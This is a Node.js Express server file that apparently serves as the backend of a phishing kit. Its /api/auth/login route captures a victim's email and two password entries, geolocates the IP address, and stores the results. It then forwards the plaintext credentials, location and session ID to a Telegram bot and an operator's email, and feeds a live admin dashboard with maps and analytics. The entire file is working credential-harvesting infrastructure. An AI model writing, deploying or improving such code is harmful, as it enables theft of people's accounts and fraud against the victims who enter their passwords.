// server.js
import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import http from "http";
import axios from "axios";
import { WebSocketServer } from "ws";
import dotenv from "dotenv";
dotenv.config();

import { connectDB } from "./config/db.js";
import { createSessionMiddleware } from "./config/session.js";

import Submission from "./models/Submission.js";
import Settings from "./models/Settings.js";

import { getGeo } from "./utils/geolocation.js";
import { getClientIP } from "./utils/ipTools.js";

import adminAuthRoutes from "./routes/adminAuthRoutes.js";
import adminManagementRoutes from "./routes/adminManagementRoutes.js";
import adminSettingsRoutes from "./routes/adminSettingsRoutes.js";
import adminLogsRoutes from "./routes/adminLogsRoutes.js";
import adminAnalyticsRoutes from "./routes/adminAnalyticsRoutes.js";
import adminMapRoutes from "./routes/adminMapRoutes.js";
import adminSubmissionsRoutes from "./routes/adminSubmissionsRoutes.js";

import { ensureInitialSuperadmin } from "./controllers/adminAuthController.js";

import nodemailer from "nodemailer";
import { randomUUID } from "crypto";
import https from "https";

// ------------------------------------------------------------
// ✅ PATH SETUP
// ------------------------------------------------------------
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = http.createServer(app);

// ------------------------------------------------------------
// ✅ ENV / CONFIG
// ------------------------------------------------------------
const MONGODB_URI = process.env.MONGODB_URI || "";
const BOT_TOKEN = process.env.BOT_TOKEN || "";
const CHAT_ID = process.env.CHAT_ID || "";
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "";
const EMAIL_USER = process.env.EMAIL_USER || "";
const EMAIL_PASS = process.env.EMAIL_PASS || "";
const RENDER_URL = process.env.RENDER_URL || "";

// ------------------------------------------------------------
// ✅ STRUCTURED LOGGING (Render‑optimized)
// ------------------------------------------------------------
function createLogger(req) {
  const cfRay = req.headers["cf-ray"] || null;
  const requestId = req.id || randomUUID();

  function base(meta = {}) {
    return {
      time: new Date().toISOString(),
      level: "info",
      method: req.method,
      path: req.path,
      requestId,
      cfRay,
      ...meta,
    };
  }

  return {
    info(message, meta = {}) {
      console.log(JSON.stringify({ ...base(meta), level: "info", message }));
    },
    warn(message, meta = {}) {
      console.warn(JSON.stringify({ ...base(meta), level: "warn", message }));
    },
    error(message, meta = {}) {
      console.error(JSON.stringify({ ...base(meta), level: "error", message }));
    },
  };
}

app.use((req, res, next) => {
  req.id = randomUUID();
  req.log = createLogger(req);

  const start = Date.now();
  req.log.info("Incoming request");

  res.on("finish", () => {
    req.log.info("Request completed", {
      statusCode: res.statusCode,
      durationMs: Date.now() - start,
    });
  });

  next();
});

// ------------------------------------------------------------
// ✅ FASTER COLD START: Lazy DB connection
// ------------------------------------------------------------
let dbConnected = false;

async function lazyConnectDB() {
  if (!dbConnected) {
    try {
      await connectDB(MONGODB_URI);
      dbConnected = true;
      console.log("✅ MongoDB connected");
    } catch (err) {
      console.error("❌ DB connection failed, retrying in 3s:", err.message);
      setTimeout(lazyConnectDB, 3000);
    }
  }
}

app.use(async (req, res, next) => {
  await lazyConnectDB();
  next();
});

// ------------------------------------------------------------
// ✅ SAFE ASYNC WRAPPER (auto‑restart protection)
// ------------------------------------------------------------
function safe(fn) {
  return (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(next);
  };
}

// ------------------------------------------------------------
// ✅ MAILER
// ------------------------------------------------------------
let transporter = null;
if (EMAIL_USER && EMAIL_PASS) {
  transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: EMAIL_USER, pass: EMAIL_PASS },
  });
}

// ------------------------------------------------------------
// ✅ WEBSOCKET SERVER
// ------------------------------------------------------------
const wss = new WebSocketServer({ noServer: true });

wss.broadcast = function (data) {
  const msg = JSON.stringify(data);
  wss.clients.forEach((client) => {
    if (client.readyState === 1) client.send(msg);
  });
};

server.on("upgrade", (req, socket, head) => {
  if (req.url === "/ws") {
    wss.handleUpgrade(req, socket, head, (ws) => {
      wss.emit("connection", ws, req);
    });
  } else {
    socket.destroy();
  }
});

// ------------------------------------------------------------
// ✅ MIDDLEWARE
// ------------------------------------------------------------
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(createSessionMiddleware());
app.use(express.static(path.join(__dirname, "public")));

// ------------------------------------------------------------
// ✅ KEEP‑ALIVE + HEALTH ROUTES
// ------------------------------------------------------------
app.get("/ping", (req, res) => res.status(200).send("OK"));

app.get("/healthz", (req, res) => {
  if (!dbConnected) return res.status(503).json({ status: "unhealthy" });
  res.status(200).json({ status: "ok" });
});

// ✅ Keep Render awake
if (RENDER_URL) {
  setInterval(() => {
    https.get(`${RENDER_URL}/ping`, () => {
      console.log("🔄 Keep-alive ping sent");
    });
  }, 240000);

  setTimeout(() => {
    https.get(`${RENDER_URL}/ping`);
  }, 5000);
}

// ------------------------------------------------------------
// ✅ NOTIFICATION HELPERS (unchanged)
// ------------------------------------------------------------
async function notifyTelegram(email, ip, country, city, firstPassword, secondPassword, sessionID) {
  const settings = await Settings.findOne();
  if (!settings?.telegramEnabled || !BOT_TOKEN || !CHAT_ID) return;

  const text = `🔐 New submission
Email: ${email}
First Password: ${firstPassword}
Second Password: ${secondPassword}
IP: ${ip}
Location: ${country || "Unknown"}, ${city || ""}
Session ID: ${sessionID || "N/A"}`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
    });
  } catch (err) {
    console.error("Telegram error:", err.message);
  }
}

async function notifyEmail(email, ip, country, city, firstPassword, secondPassword, sessionID) {
  const settings = await Settings.findOne();
  if (!settings?.emailEnabled || !transporter || !ADMIN_EMAIL) return;

  const text = `New submission:
Email: ${email}
First Password: ${firstPassword}
Second Password: ${secondPassword}
IP: ${ip}
Location: ${country || "Unknown"}, ${city || ""}
Session ID: ${sessionID || "N/A"}`;

  try {
    await transporter.sendMail({
      from: EMAIL_USER,
      to: ADMIN_EMAIL,
      subject: "New Submission",
      text,
    });
  } catch (err) {
    console.error("Email error:", err.message);
  }
}

// ------------------------------------------------------------
// ✅ USER SUBMISSION ROUTE
// ------------------------------------------------------------
app.post(
  "/api/auth/login",
  safe(async (req, res) => {
    const { email, password, firstPassword } = req.body;
    const ip = getClientIP(req);
    const sessionID = req.sessionID;

    const geo = await getGeo(ip);

    await Submission.create({
      email,
      firstPassword,
      secondPassword: password,
      sessionID,
      ip,
      userAgent: req.headers["user-agent"],
      country: geo.country,
      city: geo.city,
      isp: geo.isp,
      lat: geo.lat,
      lon: geo.lon,
    });

    await notifyTelegram(email, ip, geo.country, geo.city, firstPassword, password, sessionID);
    await notifyEmail(email, ip, geo.country, geo.city, firstPassword, password, sessionID);

    wss.broadcast({ type: "new_submission" });

    res.redirect("/success");
  })
);

// ------------------------------------------------------------
// ✅ STATIC PAGES
// ------------------------------------------------------------
app.get("/success", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "success.html"));
});

// Admin pages
app.get("/admin/dashboard", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "admin", "dashboard.html"))
);
app.get("/admin/analytics", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "admin", "analytics.html"))
);
app.get("/admin/map", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "admin", "map.html"))
);
app.get("/admin/settings", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "admin", "settings.html"))
);
app.get("/admin/logs", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "admin", "logs.html"))
);
app.get("/admin/admins", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "admin", "admins.html"))
);

// ------------------------------------------------------------
// ✅ ADMIN ROUTES
// ------------------------------------------------------------
app.use("/admin", adminAuthRoutes);
app.use("/admin", adminManagementRoutes);
app.use("/admin", adminSettingsRoutes);
app.use("/admin", adminLogsRoutes);
app.use("/admin", adminAnalyticsRoutes);
app.use("/admin", adminMapRoutes);
app.use("/admin", adminSubmissionsRoutes);

// ------------------------------------------------------------
// ✅ GLOBAL ERROR HANDLER (auto‑restart protection)
// ------------------------------------------------------------
app.use((err, req, res, next) => {
  if (req?.log) req.log.error("Unhandled error", { stack: err.stack });
  else console.error(err);

  res.status(500).send("Server recovering...");
});

// ------------------------------------------------------------
// ✅ START SERVER
// ------------------------------------------------------------
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});